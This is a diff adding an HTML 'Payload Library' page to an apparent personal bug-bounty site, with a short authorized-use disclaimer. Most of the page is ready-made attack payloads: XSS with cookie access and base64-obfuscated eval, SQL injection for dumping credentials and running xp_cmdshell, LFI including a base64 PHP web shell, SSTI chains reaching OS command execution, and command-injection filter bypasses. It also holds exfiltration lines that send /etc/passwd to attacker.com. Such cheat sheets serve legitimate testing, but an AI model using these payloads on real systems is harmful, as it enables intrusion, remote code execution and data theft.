@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Library | Command Center</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <a href="index.html" class="nav-brand">⚡ BB Command Center</a>
+            <div class="nav-toggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <ul class="nav-menu">
+                <li class="nav-item"><a href="index.html" class="nav-link">Home</a></li>
+                <li class="nav-item"><a href="tools.html" class="nav-link">Tools</a></li>
+                <li class="nav-item"><a href="payloads.html" class="nav-link">Payloads</a></li>
+                <li class="nav-item"><a href="methodology.html" class="nav-link">Methodologies</a></li>
+                <li class="nav-item"><a href="recon.html" class="nav-link">Recon</a></li>
+                <li class="nav-item"><a href="notes.html" class="nav-link">Notes</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1 style="color: var(--accent-green); font-size: 2.5rem; margin: 30px 0 15px;">💣 Payload Library</h1>
+        <p style="color: var(--text-secondary); margin-bottom: 40px; font-size: 1.1rem;">
+            Comprehensive collection of security testing payloads organized by vulnerability type
+        </p>
+
+        <!-- Disclaimer -->
+        <div class="info-box" style="background-color: rgba(255, 56, 96, 0.1); border-color: var(--warning-red);">
+            <h4 style="color: var(--warning-red);">⚠️ Legal Disclaimer</h4>
+            <p>
+                These payloads are for <strong>authorized security testing only</strong>. Only use these on systems you own 
+                or have explicit written permission to test. Unauthorized access to computer systems is illegal.
+                Use responsibly and ethically.
+            </p>
+        </div>
+
+        <!-- Tab Navigation -->
+        <div class="tabs">
+            <button class="tab-button" onclick="switchTab('xss-tab')">XSS</button>
+            <button class="tab-button" onclick="switchTab('sqli-tab')">SQL Injection</button>
+            <button class="tab-button" onclick="switchTab('redirect-tab')">Open Redirect</button>
+            <button class="tab-button" onclick="switchTab('lfi-tab')">LFI</button>
+            <button class="tab-button" onclick="switchTab('ssti-tab')">SSTI</button>
+            <button class="tab-button" onclick="switchTab('cmdi-tab')">Command Injection</button>
+            <button class="tab-button" onclick="switchTab('idor-tab')">IDOR</button>
+        </div>
+
+        <!-- XSS Tab -->
+        <div id="xss-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">Cross-Site Scripting (XSS) Payloads</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Basic XSS</h3>
+                <div class="code-block">
+                    <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;svg onload=alert('XSS')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;iframe src="javascript:alert('XSS')"&gt;</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Filter Bypass</h3>
+                <div class="code-block">
+                    <code>&lt;ScRiPt&gt;alert('XSS')&lt;/sCriPt&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;img src=x onerror="alert(String.fromCharCode(88,83,83))"&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;svg/onload=alert('XSS')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;img src=x onerror=alert`XSS`&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>javascript:alert('XSS')</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;body onload=alert('XSS')&gt;</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Attribute Context</h3>
+                <div class="code-block">
+                    <code>" onmouseover="alert('XSS')</code>
+                </div>
+                <div class="code-block">
+                    <code>' autofocus onfocus='alert('XSS')</code>
+                </div>
+                <div class="code-block">
+                    <code>" autofocus onfocus="alert(document.domain)</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Advanced XSS</h3>
+                <div class="code-block">
+                    <code>&lt;svg&gt;&lt;animatetransform onbegin=alert('XSS')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;input onfocus=alert('XSS') autofocus&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;select onfocus=alert('XSS') autofocus&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;textarea onfocus=alert('XSS') autofocus&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;keygen onfocus=alert('XSS') autofocus&gt;</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">DOM XSS</h3>
+                <div class="code-block">
+                    <code>#&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>javascript:alert(document.cookie)</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))&gt;</code>
+                </div>
+            </section>
+        </div>
+
+        <!-- SQL Injection Tab -->
+        <div id="sqli-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">SQL Injection Payloads</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Basic SQLi</h3>
+                <div class="code-block">
+                    <code>' OR '1'='1</code>
+                </div>
+                <div class="code-block">
+                    <code>' OR 1=1--</code>
+                </div>
+                <div class="code-block">
+                    <code>" OR "1"="1</code>
+                </div>
+                <div class="code-block">
+                    <code>' OR 1=1#</code>
+                </div>
+                <div class="code-block">
+                    <code>admin'--</code>
+                </div>
+                <div class="code-block">
+                    <code>admin' #</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">UNION-Based SQLi</h3>
+                <div class="code-block">
+                    <code>' UNION SELECT NULL--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT NULL,NULL--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT NULL,NULL,NULL--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT username,password FROM users--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT table_name,NULL FROM information_schema.tables--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Blind SQLi - Boolean</h3>
+                <div class="code-block">
+                    <code>' AND 1=1--</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND 1=2--</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND (SELECT 'a' FROM users LIMIT 1)='a</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Blind SQLi - Time-Based</h3>
+                <div class="code-block">
+                    <code>' AND SLEEP(5)--</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND IF(1=1,SLEEP(5),0)--</code>
+                </div>
+                <div class="code-block">
+                    <code>'; WAITFOR DELAY '00:00:05'--</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Error-Based SQLi</h3>
+                <div class="code-block">
+                    <code>' AND extractvalue(0x0a,concat(0x0a,(SELECT database())))--</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND updatexml(null,concat(0x0a,(SELECT version())),null)--</code>
+                </div>
+                <div class="code-block">
+                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Database-Specific</h3>
+                <h4 style="color: var(--accent-cyan); margin-top: 15px;">MySQL</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT @@version--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT user()--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT database()--</code>
+                </div>
+
+                <h4 style="color: var(--accent-cyan); margin-top: 15px;">PostgreSQL</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT version()--</code>
+                </div>
+                <div class="code-block">
+                    <code>' UNION SELECT current_database()--</code>
+                </div>
+
+                <h4 style="color: var(--accent-cyan); margin-top: 15px;">MSSQL</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT @@version--</code>
+                </div>
+                <div class="code-block">
+                    <code>'; EXEC xp_cmdshell('whoami')--</code>
+                </div>
+            </section>
+        </div>
+
+        <!-- Open Redirect Tab -->
+        <div id="redirect-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">Open Redirect Payloads</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Basic Redirects</h3>
+                <div class="code-block">
+                    <code>?url=https://evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?redirect=https://evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?return=https://evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?next=https://evil.com</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Protocol Bypass</h3>
+                <div class="code-block">
+                    <code>?url=//evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=///evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=////evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https:evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https;evil.com</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Domain Bypass</h3>
+                <div class="code-block">
+                    <code>?url=https://example.com@evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https://example.com.evil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https://evil.com?example.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https://evil.com#example.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https://evil.com\@example.com</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Encoding Bypass</h3>
+                <div class="code-block">
+                    <code>?url=https%3A%2F%2Fevil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=https%3a%2f%2fevil.com</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">JavaScript Redirect</h3>
+                <div class="code-block">
+                    <code>?url=javascript:alert(document.domain)</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=javascript:window.location='https://evil.com'</code>
+                </div>
+                <div class="code-block">
+                    <code>?url=javascript:eval(atob('d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tIg=='))</code>
+                </div>
+            </section>
+        </div>
+
+        <!-- LFI Tab -->
+        <div id="lfi-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">Local File Inclusion (LFI) Payloads</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Basic LFI</h3>
+                <div class="code-block">
+                    <code>?file=../../../etc/passwd</code>
+                </div>
+                <div class="code-block">
+                    <code>?page=../../../../etc/passwd</code>
+                </div>
+                <div class="code-block">
+                    <code>?include=../../../../../../etc/passwd</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Null Byte Bypass</h3>
+                <div class="code-block">
+                    <code>?file=../../../etc/passwd%00</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=../../../etc/passwd%00.jpg</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Encoding Bypass</h3>
+                <div class="code-block">
+                    <code>?file=..%2F..%2F..%2Fetc%2Fpasswd</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=..%252F..%252F..%252Fetc%252Fpasswd</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Path Truncation</h3>
+                <div class="code-block">
+                    <code>?file=../../../etc/passwd............[Add more dots to reach limit]</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Wrapper-Based LFI</h3>
+                <div class="code-block">
+                    <code>?file=php://filter/convert.base64-encode/resource=index.php</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=php://input</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=expect://whoami</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Windows LFI</h3>
+                <div class="code-block">
+                    <code>?file=..\..\..\windows\system32\drivers\etc\hosts</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=..\..\..\windows\win.ini</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=C:\windows\system32\drivers\etc\hosts</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Log Poisoning</h3>
+                <div class="code-block">
+                    <code>?file=/var/log/apache2/access.log</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=/var/log/nginx/access.log</code>
+                </div>
+                <div class="code-block">
+                    <code>?file=/var/log/mail.log</code>
+                </div>
+            </section>
+        </div>
+
+        <!-- SSTI Tab -->
+        <div id="ssti-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">Server-Side Template Injection (SSTI) Payloads</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Detection</h3>
+                <div class="code-block">
+                    <code>{{7*7}}</code>
+                </div>
+                <div class="code-block">
+                    <code>${7*7}</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;%= 7*7 %&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>${{7*7}}</code>
+                </div>
+                <div class="code-block">
+                    <code>#{7*7}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Jinja2 (Python)</h3>
+                <div class="code-block">
+                    <code>{{config.items()}}</code>
+                </div>
+                <div class="code-block">
+                    <code>{{''.__class__.__mro__[1].__subclasses__()}}</code>
+                </div>
+                <div class="code-block">
+                    <code>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</code>
+                </div>
+                <div class="code-block">
+                    <code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Twig (PHP)</h3>
+                <div class="code-block">
+                    <code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code>
+                </div>
+                <div class="code-block">
+                    <code>{{['id']|filter('system')}}</code>
+                </div>
+                <div class="code-block">
+                    <code>{{['cat /etc/passwd']|filter('system')}}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">FreeMarker (Java)</h3>
+                <div class="code-block">
+                    <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("id") }</code>
+                </div>
+                <div class="code-block">
+                    <code>${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Smarty (PHP)</h3>
+                <div class="code-block">
+                    <code>{system('id')}</code>
+                </div>
+                <div class="code-block">
+                    <code>{php}echo `id`;{/php}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Velocity (Java)</h3>
+                <div class="code-block">
+                    <code>#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">ERB (Ruby)</h3>
+                <div class="code-block">
+                    <code>&lt;%= system("id") %&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;%= `id` %&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;%= IO.popen('id').readlines() %&gt;</code>
+                </div>
+            </section>
+        </div>
+
+        <!-- Command Injection Tab -->
+        <div id="cmdi-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">Command Injection Payloads</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Basic Command Injection</h3>
+                <div class="code-block">
+                    <code>; whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>| whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>&& whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>|| whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>` whoami `</code>
+                </div>
+                <div class="code-block">
+                    <code>$(whoami)</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Blind Command Injection - Time-Based</h3>
+                <div class="code-block">
+                    <code>; sleep 5</code>
+                </div>
+                <div class="code-block">
+                    <code>| sleep 5</code>
+                </div>
+                <div class="code-block">
+                    <code>&& ping -c 5 127.0.0.1</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Blind Command Injection - Out-of-Band</h3>
+                <div class="code-block">
+                    <code>; nslookup burpcollaborator.net</code>
+                </div>
+                <div class="code-block">
+                    <code>| curl https://burpcollaborator.net</code>
+                </div>
+                <div class="code-block">
+                    <code>&& wget https://burpcollaborator.net</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Data Exfiltration</h3>
+                <div class="code-block">
+                    <code>; curl https://attacker.com?data=$(cat /etc/passwd | base64)</code>
+                </div>
+                <div class="code-block">
+                    <code>| nslookup `whoami`.burpcollaborator.net</code>
+                </div>
+                <div class="code-block">
+                    <code>&& curl -X POST -d @/etc/passwd https://attacker.com</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Filter Bypass</h3>
+                <div class="code-block">
+                    <code>;w"h"o"a"m"i</code>
+                </div>
+                <div class="code-block">
+                    <code>;who$@ami</code>
+                </div>
+                <div class="code-block">
+                    <code>;w\ho\am\i</code>
+                </div>
+                <div class="code-block">
+                    <code>;${PATH:0:1}bin${PATH:0:1}whoami</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Windows Commands</h3>
+                <div class="code-block">
+                    <code>& whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>| whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>|| whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>&& whoami</code>
+                </div>
+                <div class="code-block">
+                    <code>%0a whoami</code>
+                </div>
+            </section>
+        </div>
+
+        <!-- IDOR Tab -->
+        <div id="idor-tab" class="tab-content">
+            <section class="section">
+                <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">IDOR Testing Patterns</h2>
+                
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Numeric ID Testing</h3>
+                <div class="code-block">
+                    <code>/api/user/1
+/api/user/2
+/api/user/100
+/api/user/1000</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Sequential Testing</h3>
+                <div class="code-block">
+                    <code># If your ID is 5432, test:
+/api/user/5431
+/api/user/5433
+/api/user/5430
+/api/user/5435</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">UUID/GUID Testing</h3>
+                <div class="code-block">
+                    <code># Test different user's UUID
+/api/user/a7b9c8d6-1234-5678-9abc-def012345678
+/api/user/f9e8d7c6-5432-1098-fedc-ba0987654321</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Encoded ID Testing</h3>
+                <div class="code-block">
+                    <code># Base64 encoded IDs
+/api/user/MTIz (123)
+/api/user/MTI0 (124)
+/api/user/MTI1 (125)</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Array/Batch Testing</h3>
+                <div class="code-block">
+                    <code>POST /api/users
+{"ids": [1, 2, 3, 4, 5, 100, 200]}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Parameter Pollution</h3>
+                <div class="code-block">
+                    <code>/api/user?id=123&id=456
+/api/user?id[]=123&id[]=456
+/api/user?user_id=123&userId=456</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">HTTP Method Testing</h3>
+                <div class="code-block">
+                    <code>GET /api/user/123
+POST /api/user/123
+PUT /api/user/123
+DELETE /api/user/123
+PATCH /api/user/123</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Object Reference Swapping</h3>
+                <div class="code-block">
+                    <code># Original request:
+{"user_id": 123, "action": "view_profile"}
+
+# Test with different IDs:
+{"user_id": 124, "action": "view_profile"}
+{"user_id": 1, "action": "view_profile"}</code>
+                </div>
+
+                <h3 style="color: var(--accent-green); margin-top: 25px;">Path Traversal in IDs</h3>
+                <div class="code-block">
+                    <code>/api/user/../admin
+/api/user/./1
+/api/user/%2e%2e%2fadmin</code>
+                </div>
+            </section>
+        </div>
+
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-text">
+            Bug Bounty Command Center | Your Personal Security Research Platform
+        </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+</body>
+</html>
